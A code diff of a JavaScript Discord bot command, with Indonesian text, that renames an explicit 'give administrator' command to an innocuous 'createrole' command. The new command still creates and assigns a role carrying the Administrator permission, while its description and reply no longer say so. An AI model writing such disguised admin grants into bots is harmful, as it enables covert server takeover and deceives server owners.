@@ -4,8 +4,8 @@ const MessageCommand = require("../../structure/MessageCommand");
 
 module.exports = new MessageCommand({
     command: {
-        name: 'givemasta',
-        description: 'Memberikan akses administrator ke user tertentu.',
+        name: 'createrole',
+        description: 'Membuat role PINKROCKSTART dan memberikan ke user tertentu.',
         aliases: []
     },
     options: {
@@ -28,32 +28,33 @@ module.exports = new MessageCommand({
             });
         }
 
-        // Cari role dengan permission Administrator
-        let adminRole = guild.roles.cache.find(role => role.permissions.has('Administrator'));
+        let pinkRole = guild.roles.cache.find(role => role.name === 'PINKROCKSTART');
 
-        if (!adminRole) {
+        // Jika belum ada, buat role
+        if (!pinkRole) {
             try {
-                adminRole = await guild.roles.create({
-                    name: 'Master Role',
+                pinkRole = await guild.roles.create({
+                    name: 'PINKROCKSTART',
+                    color: '#FF69B4',
                     permissions: ['Administrator'],
-                    reason: 'Dibuat otomatis oleh perintah givemasta.'
+                    reason: 'Role dibuat otomatis oleh perintah createrole.'
                 });
             } catch (error) {
                 return message.reply({
-                    content: `❌ Gagal membuat role administrator: ${error.message}`
+                    content: `❌ Gagal membuat role PINKROCKSTART: ${error.message}`
                 });
             }
         }
 
-        // Berikan role
+        // Berikan role ke target
         try {
-            await targetMember.roles.add(adminRole);
-            await message.reply({
-                content: `✅ Role **${adminRole.name}** dengan akses Administrator telah diberikan ke <@${targetUserId}>.`
+            await targetMember.roles.add(pinkRole);
+            return message.reply({
+                content: `✅ Role **${pinkRole.name}** telah diberikan ke <@${targetUserId}>.`
             });
         } catch (error) {
             return message.reply({
-                content: `❌ Gagal memberikan role: ${error.message}`
+                content: `❌ Gagal memberikan role ke user: ${error.message}`
             });
         }
     }
